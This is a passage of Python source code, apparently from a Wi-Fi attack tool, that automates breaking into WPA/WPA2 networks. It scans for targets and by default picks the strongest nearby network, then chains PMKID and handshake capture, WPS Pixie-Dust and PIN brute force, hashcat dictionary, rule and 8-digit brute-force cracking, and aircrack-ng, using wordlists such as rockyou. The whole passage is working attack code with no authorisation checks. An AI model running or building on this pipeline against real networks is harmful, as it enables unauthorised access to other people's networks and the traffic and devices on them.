    wpa_psk = ""

    for line in output.splitlines():
        line = line.strip()

        # Match WPS PIN
        pin_match = re.search(r"WPS PIN:\s*'?([0-9]{4,8})'?", line)
        if pin_match:
            wps_pin = pin_match.group(1)

        # Match WPA PSK
        psk_match = re.search(r"WPA PSK:\s*'(.+?)'", line)
        if psk_match:
            wpa_psk = psk_match.group(1)
        elif "WPA PSK:" in line:
            # Unquoted PSK
            psk_part = line.split("WPA PSK:", 1)[1].strip()
            if psk_part:
                wpa_psk = psk_part

    return wps_pin, wpa_psk


# ---------------------------------------------------------------------------
# Hashcat cracking
# ---------------------------------------------------------------------------

def crack_with_hashcat(
    hash_file: str,
    attack_mode: str = "dictionary",
    wordlist: str = "",
) -> CrackResult:
    """Crack captured hash with hashcat (GPU-accelerated).

    Args:
        hash_file: Path to the .22000 hash file (from hcxpcapngtool).
        attack_mode: "dictionary" (mode 0), "brute" (mode 3), or "rule" (mode 0 + rules).
        wordlist: Path to wordlist file. Auto-detected if empty.

    Returns:
        CrackResult with password if cracked.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.HASHCAT, success=False)

    if not os.path.isfile(hash_file):
        result.details = f"Hash file not found: {hash_file}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    try:
        hashcat_path = find_hashcat()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Build hashcat command
    # Mode 22000 handles both PMKID and handshake hashes (WPA-PBKDF2-PMKID+EAPOL)
    cmd = [hashcat_path, "-m", "22000"]

    if attack_mode == "brute":
        # Brute force mode: try 8-digit numeric passwords (very common for ISP defaults)
        cmd.extend(["-a", "3", hash_file, "?d?d?d?d?d?d?d?d"])
    elif attack_mode == "rule":
        # Dictionary + rules
        if not wordlist:
            wordlists = find_wordlists()
            if not wordlists:
                result.details = "No wordlist found. Specify --wordlist or install rockyou.txt"
                result.time_elapsed = time.monotonic() - start_time
                return result
            wordlist = wordlists[0]
        cmd.extend(["-a", "0", "-r", _find_hashcat_rules(hashcat_path), hash_file, wordlist])
    else:
        # Dictionary mode (default)
        if not wordlist:
            wordlists = find_wordlists()
            if not wordlists:
                result.details = "No wordlist found. Specify --wordlist or install rockyou.txt"
                result.time_elapsed = time.monotonic() - start_time
                return result
            wordlist = wordlists[0]
        cmd.extend(["-a", "0", hash_file, wordlist])

    # Add common hashcat options
    cmd.extend([
        "--potfile-disable",   # Don't use potfile (we track results ourselves)
        "--status",            # Print status updates
        "--status-timer=10",   # Every 10 seconds
        "-O",                  # Optimized kernels
        "--quiet",             # Suppress banner
    ])

    # Detect GPU backend
    if _is_macos():
        cmd.extend(["--backend-devices=1"])  # Metal backend on macOS

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    stdout_data, stderr_data = proc.communicate()
    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""
    stderr_text = stderr_data.decode(errors="replace") if stderr_data else ""

    # Parse hashcat output for cracked password
    # Format: hash:password
    password = _parse_hashcat_output(stdout_text, hash_file)

    if password:
        result.success = True
        result.password = password
        result.details = f"Password cracked: {password}"
    else:
        # Check if hashcat exhausted the wordlist
        if proc.returncode == 1:
            result.details = "Hashcat exhausted wordlist -- password not found"
        elif proc.returncode == 0:
            # Returncode 0 but no password parsed -- try reading potfile/outfile
            result.details = "Hashcat completed but no password parsed from output"
        else:
            result.details = f"Hashcat exited with code {proc.returncode}. {stderr_text[:200]}"

    result.capture_file = hash_file
    result.time_elapsed = time.monotonic() - start_time
    return result


def _parse_hashcat_output(stdout: str, hash_file: str) -> str:
    """Parse hashcat stdout for cracked password.

    Hashcat prints cracked hashes as: <hash>:<password>
    For WPA mode 22000, the hash line is long, password is after the last colon.
    """
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or line.startswith("Session"):
            continue
        # WPA hash format: WPA*02*pmkid*mac_ap*mac_sta*essid*...:password
        # or just hash:password on the cracked line
        if ":" in line and ("WPA" in line or line.count(":") > 3):
            # Password is everything after the last colon in the hash line
            password = line.rsplit(":", 1)[-1]
            if password and password != line:
                return password

    return ""


def _find_hashcat_rules(hashcat_path: str) -> str:
    """Find a hashcat rules file for rule-based attacks."""
    hashcat_dir = Path(hashcat_path).parent
    rule_candidates = [
        hashcat_dir / "rules" / "best64.rule",
        hashcat_dir.parent / "share" / "hashcat" / "rules" / "best64.rule",
        Path("/usr/share/hashcat/rules/best64.rule"),
        Path("/opt/homebrew/share/hashcat/rules/best64.rule"),
        Path("/usr/local/share/hashcat/rules/best64.rule"),
    ]
    for candidate in rule_candidates:
        if candidate.exists():
            return str(candidate)
    # Fallback: just use best64.rule and hope hashcat finds it
    return "best64.rule"


# ---------------------------------------------------------------------------
# Aircrack-ng cracking (CPU fallback)
# ---------------------------------------------------------------------------

def crack_with_aircrack(capture_file: str, wordlist: str = "") -> CrackResult:
    """Crack captured handshake with aircrack-ng (CPU-only, slower than hashcat).

    This is a fallback when hashcat is not available. aircrack-ng is CPU-only
    and significantly slower, but it works on any system without GPU requirements.

    Args:
        capture_file: Path to .cap/.pcap file or .22000 hash file.
        wordlist: Path to wordlist. Auto-detected if empty.

    Returns:
        CrackResult with password if cracked.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.DICTIONARY, success=False)

    if not os.path.isfile(capture_file):
        result.details = f"Capture file not found: {capture_file}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    try:
        aircrack_path = find_aircrack()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    if not wordlist:
        wordlists = find_wordlists()
        if not wordlists:
            result.details = "No wordlist found. Specify --wordlist or install rockyou.txt"
            result.time_elapsed = time.monotonic() - start_time
            return result
        wordlist = wordlists[0]

    if not os.path.isfile(wordlist):
        result.details = f"Wordlist not found: {wordlist}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    cmd = [aircrack_path, "-w", wordlist, "-q", capture_file]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    stdout_data, stderr_data = proc.communicate()
    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""

    # Parse aircrack-ng output for "KEY FOUND! [ password ]"
    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", stdout_text)
    if key_match:
        result.success = True
        result.password = key_match.group(1)
        result.details = f"Password cracked: {result.password}"
    else:
        result.details = "Password not found in wordlist"

    result.capture_file = capture_file
    result.time_elapsed = time.monotonic() - start_time
    return result


# ---------------------------------------------------------------------------
# Wordlist discovery
# ---------------------------------------------------------------------------

def find_wordlists() -> list[str]:
    """Find available wordlists on the system.

    Searches common locations for password lists. Returns paths
    sorted by preference (rockyou first, then by size).
    """
    common_paths = [
        Path("/usr/share/wordlists/rockyou.txt"),
        Path("/usr/share/wordlists/rockyou.txt.gz"),
        Path("/opt/homebrew/share/wordlists/rockyou.txt"),
        Path.home() / ".nowifi" / "wordlists" / "rockyou.txt",
        Path.home() / "wordlists" / "rockyou.txt",
        Path("/usr/share/wordlists/darkc0de.txt"),
        Path("/usr/share/wordlists/wifite.txt"),
        Path("/usr/share/john/password.lst"),
        Path("/usr/share/wordlists/fasttrack.txt"),
        Path("/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"),
        Path("/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"),
    ]

    # Also scan the ~/.nowifi/wordlists/ directory for any .txt files
    nowifi_wl_dir = Path.home() / ".nowifi" / "wordlists"
    if nowifi_wl_dir.is_dir():
        for f in nowifi_wl_dir.iterdir():
            if f.suffix in (".txt", ".lst") and f not in common_paths:
                common_paths.append(f)

    found: list[str] = []
    for path in common_paths:
        if path.exists() and path.stat().st_size > 0:
            found.append(str(path))

    return found


# ---------------------------------------------------------------------------
# Full cracking pipeline
# ---------------------------------------------------------------------------

def run_crack(
    interface: str = "en0",
    target_ssid: str = "",
    timeout: int = 300,
    wordlist: str = "",
) -> list[CrackResult]:
    """Run full cracking pipeline against a target.

    Pipeline (ordered by speed and effectiveness):
    1. PMKID capture       -- client-less, ~60% of APs vulnerable
    2. WPS Pixie-Dust      -- fast (5-30s), ~30% of WPS-enabled APs
    3. Hashcat crack PMKID -- GPU-accelerated dictionary/brute
    4. Handshake capture   -- needs connected clients
    5. Hashcat crack handshake
    6. WPS PIN brute force -- slow (2-10h), last resort
    7. Aircrack-ng         -- CPU fallback if hashcat unavailable

    Args:
        interface: WiFi interface (monitor-mode capable for capture).
        target_ssid: Target SSID to attack (empty = scan and pick strongest).
        timeout: Max seconds for each capture phase.
        wordlist: Path to wordlist (auto-detected if empty).

    Returns:
        List of all CrackResult objects from each attempted technique.
    """
    results: list[CrackResult] = []

    # Step 1: Scan for targets
    targets = scan_targets(interface)
    if not targets:
        results.append(CrackResult(
            method=CrackMethod.PMKID,
            success=False,
            details="No WiFi networks found. Check interface and WiFi connection.",
        ))
        return results

    # Step 2: Select target
    target: WifiTarget | None = None
    if target_ssid:
        for t in targets:
            if t.ssid.lower() == target_ssid.lower():
                target = t
                break
        if target is None:
            results.append(CrackResult(
                method=CrackMethod.PMKID,
                success=False,
                details=f"Target SSID '{target_ssid}' not found. "
                        f"Visible networks: {', '.join(t.ssid for t in targets[:10])}",
            ))
            return results
    else:
        # Pick WPA/WPA2 target with strongest signal
        wpa_targets = [t for t in targets if "wpa" in t.security.lower() or "wpa2" in t.security.lower()]
        if wpa_targets:
            target = wpa_targets[0]  # Already sorted by signal
        else:
            target = targets[0]

    # Enrich target with WPS info if not already set
    if not target.wps_enabled:
        try:
            wps_targets = scan_wps_targets(interface, timeout=10)
            for wt in wps_targets:
                if wt.bssid.lower() == target.bssid.lower():
                    target.wps_enabled = wt.wps_enabled
                    target.wps_locked = wt.wps_locked
                    target.wps_version = wt.wps_version
                    break
        except Exception:
            pass  # WPS scan is best-effort

    # Step 3: Try PMKID capture (client-less, most effective)
    pmkid_result = capture_pmkid(target, interface, timeout=timeout)
    results.append(pmkid_result)

    # Step 4: WPS Pixie-Dust (fast, try before slow hashcat)
    if target.wps_enabled and not target.wps_locked:
        pixie_result = crack_wps_pixie(target, interface, timeout=min(timeout, 300))
        results.append(pixie_result)

        if pixie_result.success and pixie_result.password:
            return results

    # Step 5: Crack PMKID with hashcat (if captured)
    if pmkid_result.success and pmkid_result.capture_file:
        crack_result = crack_with_hashcat(
            pmkid_result.capture_file,
            attack_mode="dictionary",
            wordlist=wordlist,
        )
        results.append(crack_result)

        if crack_result.success:
            return results

        # Try brute force (8-digit numeric, common ISP defaults)
        brute_result = crack_with_hashcat(
            pmkid_result.capture_file,
            attack_mode="brute",
        )
        results.append(brute_result)

        if brute_result.success:
            return results

        # Try aircrack-ng as fallback
        aircrack_result = crack_with_aircrack(pmkid_result.capture_file, wordlist)
        results.append(aircrack_result)

        if aircrack_result.success:
            return results

    # Step 6: Try handshake capture (needs clients)
    handshake_result = capture_handshake(target, interface, timeout=timeout)
    results.append(handshake_result)

    if handshake_result.success and handshake_result.capture_file:
        # Step 7: Crack handshake with hashcat
        crack_result = crack_with_hashcat(
            handshake_result.capture_file,
            attack_mode="dictionary",
            wordlist=wordlist,
        )
        results.append(crack_result)

        if crack_result.success:
            return results

        # Try brute force
        brute_result = crack_with_hashcat(
            handshake_result.capture_file,
            attack_mode="brute",
        )
        results.append(brute_result)

        if brute_result.success:
            return results

        # Aircrack-ng fallback
        aircrack_result = crack_with_aircrack(handshake_result.capture_file, wordlist)
        results.append(aircrack_result)

        if aircrack_result.success:
            return results

    # Step 8: WPS PIN brute force (slow, last resort -- 2-10 hours)
    if target.wps_enabled and not target.wps_locked:
        pin_result = crack_wps_pin(target, interface, timeout=min(timeout * 4, 3600))
        results.append(pin_result)

    return results
